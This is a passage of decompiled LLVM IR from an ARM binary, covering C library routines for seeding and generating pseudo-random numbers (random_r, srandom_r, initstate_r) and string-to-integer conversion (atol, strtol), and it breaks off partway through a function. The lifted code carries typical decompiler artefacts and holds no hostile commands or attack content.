dec_label_pc_1752c:                               ; preds = %dec_label_pc_174dc, %dec_label_pc_17504
  %v0_1752c = load i32, i32* %r6.global-to-local, align 4
  %v1_1752c = load i32, i32* %r5.global-to-local, align 4
  %v4_1752c = mul i32 %v1_1752c, 4
  %v5_1752c = add i32 %v4_1752c, %v0_1752c
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_17534 = load i32, i32* %r4.global-to-local, align 4
  %v2_17534 = add i32 %v1_17534, 16
  %v3_17534 = inttoptr i32 %v2_17534 to i32*
  store i32 %v5_1752c, i32* %v3_17534, align 4
  %v0_17538 = load i32, i32* %r6.global-to-local, align 4
  %v1_17538 = load i32, i32* %r4.global-to-local, align 4
  %v2_17538 = add i32 %v1_17538, 8
  %v3_17538 = inttoptr i32 %v2_17538 to i32*
  store i32 %v0_17538, i32* %v3_17538, align 4
  %v1_17558.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17550

dec_label_pc_17540:                               ; preds = %bb
  %v0_17540 = call i32 @__GI___errno_location()
  %v2_17548 = inttoptr i32 %v0_17540 to i32*
  store i32 22, i32* %v2_17548, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17550

dec_label_pc_17550:                               ; preds = %dec_label_pc_1752c, %dec_label_pc_17540
  %v1_17558 = phi i32 [ %v1_17558.pre, %dec_label_pc_1752c ], [ -1, %dec_label_pc_17540 ]
  %v2_17554 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_17554, i32* @r4, align 4
  ret i32 %v1_17558

; uselistorder directives
  uselistorder i32 %v0_1751c, { 1, 0 }
  uselistorder i32 %v2_17518, { 1, 0 }
  uselistorder i32 %v3_174c0, { 1, 0 }
  uselistorder i32 %tmp, { 1, 2, 0, 4, 3, 5 }
  uselistorder i32* %r6.global-to-local, { 1, 2, 3, 4, 5, 0, 6 }
  uselistorder i32* %r1.global-to-local, { 3, 4, 0, 1, 5, 6, 2 }
  uselistorder i32* %r0.global-to-local, { 5, 6, 7, 0, 1, 2, 3, 8, 9, 4 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_17550, { 1, 0 }
  uselistorder label %dec_label_pc_1752c, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @__GI_random_r(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_17564 = load i32, i32* @r4, align 4
  store i32 %v3_17564, i32* %stack_var_-8, align 4
  %v1_17568 = add i32 %tmp, 12
  %v2_17568 = inttoptr i32 %v1_17568 to i8*
  %v3_17568 = load i8, i8* %v2_17568, align 1
  %v4_17568 = sext i8 %v3_17568 to i32
  store i32 %v4_17568, i32* %r3.global-to-local, align 4
  %v2_1756c = icmp eq i8 %v3_17568, 0
  store i32 %tmp, i32* %ip.global-to-local, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %v1_17578 = add i32 %tmp, 8
  %v2_17578 = inttoptr i32 %v1_17578 to i32*
  %v3_17578 = load i32, i32* %v2_17578, align 4
  store i32 %v3_17578, i32* %lr.global-to-local, align 4
  br i1 %v2_1756c, label %dec_label_pc_17580, label %dec_label_pc_175a4

dec_label_pc_17580:                               ; preds = %entry
  %v1_17580 = inttoptr i32 %v3_17578 to i32*
  %v2_17580 = load i32, i32* %v1_17580, align 4
  store i32 %v2_17580, i32* %r2.global-to-local, align 4
  %v2_17588 = mul i32 %v2_17580, 1103515245
  %v1_17590 = add i32 %v2_17588, 12345
  %tmp6 = bitcast i32 %v1_17590 to float
  %tmp7 = call float @fabsf(float %tmp6)
  %v1_17594 = bitcast float %tmp7 to i32
  store i32 %v1_17594, i32* %r3.global-to-local, align 4
  store i32 %v1_17594, i32* %v1_17580, align 4
  %v0_1759c = load i32, i32* %r3.global-to-local, align 4
  %v2_1759c = inttoptr i32 %arg2 to i32*
  store i32 %v0_1759c, i32* %v2_1759c, align 4
  br label %dec_label_pc_175e4

dec_label_pc_175a4:                               ; preds = %entry
  %v2_175a4 = load i32, i32* %arg1, align 4
  store i32 %v2_175a4, i32* %r2.global-to-local, align 4
  %v1_175a8 = add i32 %tmp, 4
  %v2_175a8 = inttoptr i32 %v1_175a8 to i32*
  %v3_175a8 = load i32, i32* %v2_175a8, align 4
  store i32 %v3_175a8, i32* %r0.global-to-local, align 4
  %v1_175ac = inttoptr i32 %v2_175a4 to i32*
  %v2_175ac = load i32, i32* %v1_175ac, align 4
  store i32 %v2_175ac, i32* %r1.global-to-local, align 4
  %v1_175b0 = inttoptr i32 %v3_175a8 to i32*
  %v2_175b0 = load i32, i32* %v1_175b0, align 4
  %v4_175b0 = add i32 %v3_175a8, 4
  store i32 %v4_175b0, i32* %r0.global-to-local, align 4
  %v2_175b4 = add i32 %v2_175b0, %v2_175ac
  store i32 %v2_175b4, i32* %r3.global-to-local, align 4
  store i32 %v2_175b4, i32* %v1_175ac, align 4
  %v3_175b8 = load i32, i32* %r2.global-to-local, align 4
  %v4_175b8 = add i32 %v3_175b8, 4
  store i32 %v4_175b8, i32* %r2.global-to-local, align 4
  %v0_175bc = load i32, i32* %ip.global-to-local, align 4
  %v1_175bc = add i32 %v0_175bc, 16
  %v2_175bc = inttoptr i32 %v1_175bc to i32*
  %v3_175bc = load i32, i32* %v2_175bc, align 4
  store i32 %v3_175bc, i32* %r1.global-to-local, align 4
  %v0_175c0 = load i32, i32* %r3.global-to-local, align 4
  %v3_175c0 = udiv i32 %v0_175c0, 2
  store i32 %v3_175c0, i32* %r3.global-to-local, align 4
  %v3_175c4 = icmp ult i32 %v4_175b8, %v3_175bc
  %v1_175c8 = load i32, i32* %r4.global-to-local, align 4
  %v2_175c8 = inttoptr i32 %v1_175c8 to i32*
  store i32 %v3_175c0, i32* %v2_175c8, align 4
  br i1 %v3_175c4, label %dec_label_pc_175d4, label %._crit_edge

._crit_edge:                                      ; preds = %dec_label_pc_175a4
  %v1_175cc = load i32, i32* %lr.global-to-local, align 4
  store i32 %v1_175cc, i32* %r2.global-to-local, align 4
  %v0_175dc.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb5

dec_label_pc_175d4:                               ; preds = %dec_label_pc_175a4
  %v0_175d4 = load i32, i32* %r0.global-to-local, align 4
  %v1_175d4 = load i32, i32* %r1.global-to-local, align 4
  %v3_175d4 = icmp ult i32 %v0_175d4, %v1_175d4
  br i1 %v3_175d4, label %bb5, label %bb

bb:                                               ; preds = %dec_label_pc_175d4
  %v1_175d8 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v1_175d8, i32* %r0.global-to-local, align 4
  br label %bb5

bb5:                                              ; preds = %dec_label_pc_175d4, %._crit_edge, %bb
  %v0_175dc = phi i32 [ %v0_175dc.pre, %._crit_edge ], [ %v0_175d4, %dec_label_pc_175d4 ], [ %v1_175d8, %bb ]
  %v1_175dc = load i32, i32* %ip.global-to-local, align 4
  %v2_175dc = add i32 %v1_175dc, 4
  %v3_175dc = inttoptr i32 %v2_175dc to i32*
  store i32 %v0_175dc, i32* %v3_175dc, align 4
  %v0_175e0 = load i32, i32* %r2.global-to-local, align 4
  %v1_175e0 = load i32, i32* %ip.global-to-local, align 4
  %v2_175e0 = inttoptr i32 %v1_175e0 to i32*
  store i32 %v0_175e0, i32* %v2_175e0, align 4
  br label %dec_label_pc_175e4

dec_label_pc_175e4:                               ; preds = %dec_label_pc_17580, %bb5
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_175e8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_175e8, i32* @r4, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v3_175c0, { 1, 0 }
  uselistorder i32 %v1_17594, { 1, 0 }
  uselistorder i32 %tmp, { 0, 3, 2, 1, 4 }
  uselistorder i32* %r2.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 4, 3, 5, 6, 0 }
  uselistorder label %dec_label_pc_175e4, { 1, 0 }
  uselistorder label %bb5, { 2, 0, 1 }
}

define i32 @srandom_r(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_175f4 = load i32, i32* @r4, align 4
  store i32 %v3_175f4, i32* %stack_var_-36, align 4
  %v1_175f8 = add i32 %tmp, 12
  %v2_175f8 = inttoptr i32 %v1_175f8 to i8*
  %v3_175f8 = load i8, i8* %v2_175f8, align 1
  store i32 %tmp, i32* %r5.global-to-local, align 4
  %v3_17608 = load i8, i8* %v2_175f8, align 1
  %tmp33 = icmp ugt i8 %v3_175f8, 4
  br i1 %tmp33, label %.dec_label_pc_176b4_crit_edge, label %dec_label_pc_17614

.dec_label_pc_176b4_crit_edge:                    ; preds = %entry
  br label %dec_label_pc_176b4

dec_label_pc_17614:                               ; preds = %entry
  %v0_17614 = load i32, i32* @r0, align 4
  %v2_17614 = icmp eq i32 %v0_17614, 0
  %v1_17618 = add i32 %tmp, 8
  %v2_17618 = inttoptr i32 %v1_17618 to i32*
  %v3_17618 = load i32, i32* %v2_17618, align 4
  store i32 %v3_17618, i32* %r6.global-to-local, align 4
  br i1 %v2_17614, label %bb, label %bb23

bb:                                               ; preds = %dec_label_pc_17614
  store i32 1, i32* @r0, align 4
  br label %bb23

bb23:                                             ; preds = %dec_label_pc_17614, %bb
  %v0_17624 = phi i32 [ %v0_17614, %dec_label_pc_17614 ], [ 1, %bb ]
  %v2_17620 = icmp eq i8 %v3_17608, 0
  %v2_17624 = inttoptr i32 %v3_17618 to i32*
  store i32 %v0_17624, i32* %v2_17624, align 4
  br i1 %v2_17620, label %dec_label_pc_176b0, label %dec_label_pc_1762c

dec_label_pc_1762c:                               ; preds = %bb23
  %v1_1762c = add i32 %tmp, 13
  %v2_1762c = inttoptr i32 %v1_1762c to i8*
  %v3_1762c = load i8, i8* %v2_1762c, align 1
  %v4_1762c = sext i8 %v3_1762c to i32
  store i32 %v4_1762c, i32* %sl.global-to-local, align 4
  store i32 16807, i32* %fp.global-to-local, align 4
  store i32 2836, i32* %sb.global-to-local, align 4
  %v0_17638 = load i32, i32* @r0, align 4
  store i32 %v0_17638, i32* %r4.global-to-local, align 4
  %v0_1763c = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_1763c, i32* %r8.global-to-local, align 4
  store i32 2, i32* %r7.global-to-local, align 4
  %v5_1767c25 = icmp sgt i8 %v3_1762c, 1
  br i1 %v5_1767c25, label %dec_label_pc_17648, label %dec_label_pc_17680

dec_label_pc_17648:                               ; preds = %dec_label_pc_1762c, %dec_label_pc_17648.dec_label_pc_17648_crit_edge
  %v1_1765c = phi i32 [ %v1_1765c.pre, %dec_label_pc_17648.dec_label_pc_17648_crit_edge ], [ 2836, %dec_label_pc_1762c ]
  %v1_17650 = phi i32 [ %v1_17650.pre, %dec_label_pc_17648.dec_label_pc_17648_crit_edge ], [ 16807, %dec_label_pc_1762c ]
  %v0_1764c27 = phi i32 [ %v0_17670.pre, %dec_label_pc_17648.dec_label_pc_17648_crit_edge ], [ %v0_17638, %dec_label_pc_1762c ]
  %v1_1766826 = phi i32 [ %v5_17668, %dec_label_pc_17648.dec_label_pc_17648_crit_edge ], [ %v0_1763c, %dec_label_pc_1762c ]
  %v3_17648 = urem i32 %v0_1764c27, ptrtoint ([8 x i8]* @global_var_1f31d.1038 to i32)
  %v2_17650 = mul i32 %v1_17650, %v3_17648
  %v2_17658 = sdiv i32 %v0_1764c27, ptrtoint ([8 x i8]* @global_var_1f31d.1038 to i32)
  %v2_1765c = mul i32 %v1_1765c, %v2_17658
  %v2_17660 = sub i32 %v2_17650, %v2_1765c
  %v8_17660 = icmp slt i32 %v2_17660, 0
  %v2_17664 = add i32 %v2_17660, 2147483647
  %v2_17664.v2_17660 = select i1 %v8_17660, i32 %v2_17664, i32 %v2_17660
  store i32 %v2_17664.v2_17660, i32* %r4.global-to-local, align 4
  %v2_17668 = add i32 %v1_1766826, 4
  %v3_17668 = inttoptr i32 %v2_17668 to i32*
  store i32 %v2_17664.v2_17660, i32* %v3_17668, align 4
  %v4_17668 = load i32, i32* %r8.global-to-local, align 4
  %v5_17668 = add i32 %v4_17668, 4
  store i32 %v5_17668, i32* %r8.global-to-local, align 4
  %v0_1766c.pre = load i32, i32* %r7.global-to-local, align 4
  %v1_1766c.pre = load i32, i32* %sl.global-to-local, align 4
  %v0_17670.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_17678 = add i32 %v0_1766c.pre, 1
  store i32 %v1_17678, i32* %r7.global-to-local, align 4
  %v5_1767c = icmp slt i32 %v0_1766c.pre, %v1_1766c.pre
  br i1 %v5_1767c, label %dec_label_pc_17648.dec_label_pc_17648_crit_edge, label %dec_label_pc_1766c.dec_label_pc_17680_crit_edge

dec_label_pc_17648.dec_label_pc_17648_crit_edge:  ; preds = %dec_label_pc_17648
  %v1_17650.pre = load i32, i32* %fp.global-to-local, align 4
  %v1_1765c.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_17648

dec_label_pc_1766c.dec_label_pc_17680_crit_edge:  ; preds = %dec_label_pc_17648
  %v0_17690.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_17680

dec_label_pc_17680:                               ; preds = %dec_label_pc_1766c.dec_label_pc_17680_crit_edge, %dec_label_pc_1762c
  %v0_17690 = phi i32 [ %v0_17690.pre, %dec_label_pc_1766c.dec_label_pc_17680_crit_edge ], [ %v0_1763c, %dec_label_pc_1762c ]
  %v0_17684.lcssa = phi i32 [ %v1_1766c.pre, %dec_label_pc_1766c.dec_label_pc_17680_crit_edge ], [ %v4_1762c, %dec_label_pc_1762c ]
  %v2_17684 = mul i32 %v0_17684.lcssa, 10
  store i32 %v2_17684, i32* @r4, align 4
  %v0_17688 = load i32, i32* %r5.global-to-local, align 4
  %v1_17688 = add i32 %v0_17688, 14
  %v2_17688 = inttoptr i32 %v1_17688 to i8*
  %v3_17688 = load i8, i8* %v2_17688, align 1
  %v4_17688 = sext i8 %v3_17688 to i32
  %v2_1768c = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_1768c, i32* %r7.global-to-local, align 4
  %v4_17690 = mul nsw i32 %v4_17688, 4
  %v5_17690 = add i32 %v0_17690, %v4_17690
  %v1_17694 = inttoptr i32 %v0_17688 to i32*
  store i32 %v5_17690, i32* %v1_17694, align 4
  %v3_17694 = add i32 %v0_17688, 4
  %v4_17694 = inttoptr i32 %v3_17694 to i32*
  %v5_17694 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v5_17694, i32* %v4_17694, align 4
  br label %dec_label_pc_176a0

dec_label_pc_1769c:                               ; preds = %dec_label_pc_176a0
  %v0_176a4 = load i32, i32* %r5.global-to-local, align 4
  %v2_1769c = inttoptr i32 %v0_176a4 to i32*
  %v3_1769c = call i32 @__GI_random_r(i32* %v2_1769c, i32 %v2_1768c)
  br label %dec_label_pc_176a0

dec_label_pc_176a0:                               ; preds = %dec_label_pc_17680, %dec_label_pc_1769c
  %v0_176a0 = load i32, i32* @r4, align 4
  %v1_176a0 = add i32 %v0_176a0, -1
  store i32 %v1_176a0, i32* @r4, align 4
  %v6_176a0 = icmp slt i32 %v1_176a0, 0
  br i1 %v6_176a0, label %dec_label_pc_176b0, label %dec_label_pc_1769c

dec_label_pc_176b0:                               ; preds = %dec_label_pc_176a0, %bb23
  %v2_176b8.pre = load i32, i32* %stack_var_-36, align 4
  br label %dec_label_pc_176b4

dec_label_pc_176b4:                               ; preds = %.dec_label_pc_176b4_crit_edge, %dec_label_pc_176b0
  %v2_176b8 = phi i32 [ %v3_175f4, %.dec_label_pc_176b4_crit_edge ], [ %v2_176b8.pre, %dec_label_pc_176b0 ]
  %v1_176bc = phi i32 [ -1, %.dec_label_pc_176b4_crit_edge ], [ 0, %dec_label_pc_176b0 ]
  store i32 %v2_176b8, i32* @r4, align 4
  ret i32 %v1_176bc

; uselistorder directives
  uselistorder i32 %v1_176a0, { 1, 0 }
  uselistorder i32 %v0_17688, { 1, 0, 2 }
  uselistorder i32 %v0_1766c.pre, { 1, 0 }
  uselistorder i32 %v5_17668, { 1, 0 }
  uselistorder i32 %v0_1764c27, { 1, 0 }
  uselistorder i32 %v0_1763c, { 1, 0, 2 }
  uselistorder i32 %tmp, { 0, 1, 3, 2 }
  uselistorder i32* %r6.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 0 }
  uselistorder i32 (i32*, i32)* @__GI_random_r, { 1, 0 }
  uselistorder i32 ptrtoint ([8 x i8]* @global_var_1f31d.1038 to i32), { 1, 0 }
  uselistorder label %dec_label_pc_176b4, { 1, 0 }
  uselistorder label %dec_label_pc_176a0, { 1, 0 }
  uselistorder label %dec_label_pc_17648, { 1, 0 }
  uselistorder label %bb23, { 1, 0 }
}

define i32 @"$d.1"(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_176c0:
  %v0_176c0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_176c0, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_176c0
  %v2_176c0 = load i32, i32* @r7, align 4
  %v5_176c0 = udiv i32 %v2_176c0, 8
  %v6_176c0 = and i32 %v5_176c0, %arg1
  %v3_176c4 = load i32, i32* @fp, align 4
  %v8_176c4 = shl i32 %v6_176c0, %v3_176c4
  %v9_176c4 = and i32 %v8_176c4, %arg1
  %v2_176c8 = load i32, i32* @sp, align 4
  %v8_176c8 = shl i32 %v2_176c8, %arg3
  %v9_176c8 = and i32 %v8_176c8, %arg2
  call void @__pseudo_branch(i32 %v9_176c8)
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_176c0, %bb
  %v10_176c8 = phi i32 [ %arg1, %dec_label_pc_176c0 ], [ %v9_176c4, %bb ]
  ret i32 %v10_176c8

; uselistorder directives
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__GI_initstate_r(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v3_176cc = load i32, i32* @r4, align 4
  %v6_176cc = load i32, i32* @r5, align 4
  store i32 %tmp, i32* @r7, align 4
  store i32 %arg3, i32* @r5, align 4
  %tmp28 = icmp ult i32 %arg2, 128
  br i1 %tmp28, label %dec_label_pc_176fc, label %dec_label_pc_176ec

dec_label_pc_176ec:                               ; preds = %entry
  %v2_176ec = icmp ugt i32 %arg2, 254
  %v7_176ec = icmp eq i32 %arg2, 255
  %v2_176f0 = xor i1 %v7_176ec, true
  %v3_176f0 = and i1 %v2_176ec, %v2_176f0
  br i1 %v3_176f0, label %bb, label %bb21

bb:                                               ; preds = %dec_label_pc_176ec
  store i32 4, i32* @r4, align 4
  br label %bb21

bb21:                                             ; preds = %dec_label_pc_176ec, %bb
  %v1_177287 = phi i32 [ %v3_176cc, %dec_label_pc_176ec ], [ 4, %bb ]
  %v2_176f4 = xor i1 %v2_176ec, true
  %v3_176f4 = or i1 %v7_176ec, %v2_176f4
  br i1 %v3_176f4, label %bb22, label %bb26

bb22:                                             ; preds = %bb21
  store i32 3, i32* @r4, align 4
  br label %bb26

dec_label_pc_176fc:                               ; preds = %entry
  %tmp29 = icmp ugt i32 %arg2, 31
  br i1 %tmp29, label %dec_label_pc_17714, label %dec_label_pc_17704

dec_label_pc_17704:                               ; preds = %dec_label_pc_176fc
  %tmp30 = icmp ugt i32 %arg2, 7
  br i1 %tmp30, label %.thread10, label %dec_label_pc_17784

.thread10:                                        ; preds = %dec_label_pc_17704
  store i32 0, i32* @r4, align 4
  br label %bb26

dec_label_pc_17714:                               ; preds = %dec_label_pc_176fc
  %v2_17714 = icmp ugt i32 %arg2, 62
  %v7_17714 = icmp eq i32 %arg2, 63
  %v2_17718 = xor i1 %v7_17714, true
  %v3_17718 = and i1 %v2_17714, %v2_17718
  br i1 %v3_17718, label %bb23, label %bb24

bb23:                                             ; preds = %dec_label_pc_17714
  store i32 2, i32* @r4, align 4
  br label %bb24

bb24:                                             ; preds = %dec_label_pc_17714, %bb23
  %v1_177286 = phi i32 [ %v3_176cc, %dec_label_pc_17714 ], [ 2, %bb23 ]
  %v2_1771c = xor i1 %v2_17714, true
  %v3_1771c = or i1 %v7_17714, %v2_1771c
  br i1 %v3_1771c, label %bb25, label %bb26

bb25:                                             ; preds = %bb24
  store i32 1, i32* @r4, align 4
  br label %bb26

bb26:                                             ; preds = %.thread10, %bb22, %bb21, %bb24, %bb25
  %v1_17734 = phi i32 [ 3, %bb22 ], [ %v1_177287, %bb21 ], [ %v1_177286, %bb24 ], [ 1, %bb25 ], [ 0, %.thread10 ]
  store i32 add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 -35392), i32* %r3.global-to-local, align 4
  %v4_17728 = mul i32 %v1_17734, 4
  %v5_17728 = add i32 %v4_17728, add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 -35392)
  store i32 %v5_17728, i32* %r2.global-to-local, align 4
  %v1_1772c = add i32 %v4_17728, add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 -35372)
  %v2_1772c = inttoptr i32 %v1_1772c to i32*
  %v3_1772c = load i32, i32* %v2_1772c, align 4
  store i32 %v3_1772c, i32* %r1.global-to-local, align 4
  %v1_17730 = add i32 %tmp, 4
  store i32 %v1_17730, i32* @r6, align 4
  %v6_17734 = inttoptr i32 %v5_17728 to i32*
  %v7_17734 = load i32, i32* %v6_17734, align 4
  store i32 %v7_17734, i32* %r2.global-to-local, align 4
  %v4_17738 = mul i32 %v3_1772c, 4
  %v5_17738 = add i32 %v4_17738, %v1_17730
  store i32 %v5_17738, i32* %r3.global-to-local, align 4
  %v2_1773c = add i32 %arg3, 16
  %v3_1773c = inttoptr i32 %v2_1773c to i32*
  store i32 %v5_17738, i32* %v3_1773c, align 4
  %v0_17740 = load i32, i32* %r2.global-to-local, align 4
  %v1_17740 = trunc i32 %v0_17740 to i8
  %v2_17740 = load i32, i32* @r5, align 4
  %v3_17740 = add i32 %v2_17740, 14
  %v4_17740 = inttoptr i32 %v3_17740 to i8*
  store i8 %v1_17740, i8* %v4_17740, align 1
  %v0_17744 = load i32, i32* %r1.global-to-local, align 4
  %v1_17744 = trunc i32 %v0_17744 to i8
  %v2_17744 = load i32, i32* @r5, align 4
  %v3_17744 = add i32 %v2_17744, 13
  %v4_17744 = inttoptr i32 %v3_17744 to i8*
  store i8 %v1_17744, i8* %v4_17744, align 1
  %v0_17748 = load i32, i32* @r4, align 4
  %v1_17748 = trunc i32 %v0_17748 to i8
  %v2_17748 = load i32, i32* @r5, align 4
  %v3_17748 = add i32 %v2_17748, 12
  %v4_17748 = inttoptr i32 %v3_17748 to i8*
  store i8 %v1_17748, i8* %v4_17748, align 1
  %v0_1774c = load i32, i32* @r6, align 4
  %v1_1774c = load i32, i32* @r5, align 4
  %v2_1774c = add i32 %v1_1774c, 8
  %v3_1774c = inttoptr i32 %v2_1774c to i32*
  store i32 %v0_1774c, i32* %v3_1774c, align 4
  %v0_17750 = load i32, i32* @r5, align 4
  store i32 %v0_17750, i32* %r1.global-to-local, align 4
  %v0_17754 = load i32, i32* @r0, align 4
  %v2_17754 = inttoptr i32 %v0_17754 to i32*
  %v3_17754 = call i32 @srandom_r(i32* %v2_17754, i32 %v0_17750)
  store i32 %v3_17754, i32* %r0.global-to-local, align 4
  %v0_17758 = load i32, i32* @r4, align 4
  %v2_17758 = icmp eq i32 %v0_17758, 0
  br i1 %v2_17758, label %bb27, label %.thread4

bb27:                                             ; preds = %bb26
  %v1_1777412 = load i32, i32* @r7, align 4
  %v2_1777413 = inttoptr i32 %v1_1777412 to i32*
  store i32 0, i32* %v2_1777413, align 4
  %v1_17778 = load i32, i32* @r4, align 4
  store i32 %v1_17778, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1779c

.thread4:                                         ; preds = %bb26
  %v1_1775c = load i32, i32* @r5, align 4
  %v2_1775c = add i32 %v1_1775c, 4
  %v3_1775c = inttoptr i32 %v2_1775c to i32*
  %v4_1775c = load i32, i32* %v3_1775c, align 4
  %v1_17760 = load i32, i32* @r6, align 4
  %v3_17760 = sub i32 %v4_1775c, %v1_17760
  %v4_17764 = sdiv i32 %v3_17760, 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v4_1776c = mul i32 %v4_17764, 5
  %v5_1776c = add i32 %v4_1776c, %v0_17758
  store i32 %v5_1776c, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_17774 = load i32, i32* @r7, align 4
  %v2_17774 = inttoptr i32 %v1_17774 to i32*
  store i32 0, i32* %v2_17774, align 4
  %v1_1777c = load i32, i32* %r3.global-to-local, align 4
  %v2_1777c = load i32, i32* @r7, align 4
  %v3_1777c = inttoptr i32 %v2_1777c to i32*
  store i32 %v1_1777c, i32* %v3_1777c, align 4
  %v1_177a4.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1779c

dec_label_pc_17784:                               ; preds = %dec_label_pc_17704
  %v0_17784 = call i32 @__GI___errno_location()
  store i32 %v0_17784, i32* %r0.global-to-local, align 4
  store i32 22, i32* %r4.global-to-local, align 4
  %v2_1778c = inttoptr i32 %v0_17784 to i32*
  store i32 22, i32* %v2_1778c, align 4
  %v0_17790 = call i32 @__GI___errno_location()
  %v0_17794 = load i32, i32* %r4.global-to-local, align 4
  %v2_17794 = inttoptr i32 %v0_17790 to i32*
  store i32 %v0_17794, i32* %v2_17794, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1779c

dec_label_pc_1779c:                               ; preds = %bb27, %.thread4, %dec_label_pc_17784
  %v1_177a4 = phi i32 [ %v1_177a4.pre, %.thread4 ], [ %v1_17778, %bb27 ], [ -1, %dec_label_pc_17784 ]
  store i32 %v3_176cc, i32* @r4, align 4
  store i32 %v6_176cc, i32* @r5, align 4
  ret i32 %v1_177a4

; uselistorder directives
  uselistorder i1 %v7_17714, { 1, 0 }
  uselistorder i1 %v7_176ec, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 4, 2, 3, 1, 5 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 -35392), { 1, 0, 2 }
  uselistorder i32 %arg2, { 3, 4, 0, 1, 6, 5, 2, 7 }
  uselistorder label %dec_label_pc_1779c, { 2, 1, 0 }
  uselistorder label %bb26, { 4, 3, 0, 1, 2 }
  uselistorder label %bb24, { 1, 0 }
  uselistorder label %bb21, { 1, 0 }
}

define i32 @atol(i32 %arg1) local_unnamed_addr {
entry:
  store i32 0, i32* @r1, align 4
  store i32 10, i32* @r2, align 4
  %v0_177c0 = call i32 @strtol()
  ret i32 %v0_177c0
}

define i32 @strtol() local_unnamed_addr {
entry:
  store i32 1, i32* @r3, align 4
  %v0_177dc = call i32 @_stdlib_strto_l()
  ret i32 %v0_177dc
}

define i32 @_stdlib_strto_l() local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %v0_17800 = load i32, i32* @r1, align 4
  store i32 %v0_17800, i32* %fp.global-to-local, align 4
  %v0_17804 = load i32, i32* @r2, align 4
  store i32 %v0_17804, i32* %r5.global-to-local, align 4
  %v0_17808 = load i32, i32* @r0, align 4
  store i32 %v0_17808, i32* %r4.global-to-local, align 4
  %v0_1780c = load i32, i32* @r3, align 4
  br label %dec_label_pc_17818

dec_label_pc_17814:                               ; preds = %dec_label_pc_17818
  %v1_17814 = add i32 %v0_17850, 1
  store i32 %v1_17814, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_17818

dec_label_pc_17818:                               ; preds = %entry, %dec_label_pc_17814
  %v0_17850 = phi i32 [ %v0_17808, %entry ], [ %v1_17814, %dec_label_pc_17814 ]
  %v1_17818 = inttoptr i32 %v0_17850 to i8*
  %v2_17818 = load i8, i8* %v1_17818, align 1
